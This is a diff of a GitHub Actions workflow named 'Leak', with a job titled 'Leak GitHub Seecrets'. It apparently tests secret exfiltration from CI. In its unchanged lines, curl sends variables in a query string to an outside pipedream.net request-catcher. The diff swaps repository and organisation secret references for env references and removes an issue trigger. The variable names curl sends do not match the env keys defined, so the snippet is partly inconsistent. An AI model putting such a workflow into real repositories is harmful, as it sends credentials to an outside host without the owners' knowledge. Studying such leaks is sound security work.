@@ -2,9 +2,7 @@ name: Leak
 
 on:
   issues:
-    type:[milestoned]
  
-   
 jobs:
   leak:
     name: Leak GitHub Seecrets
@@ -17,5 +15,5 @@ jobs:
           curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_XYZ
           curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
         env:
-          VALUE: ${{ secrets.PARENT_TEST }}
-          VALUE2: ${{ secrets.ORG_SEC }}
+          VALUE: ${{ env.PARENT_TEST }}
+          VALUE2: ${{ env.ORG_SEC }}
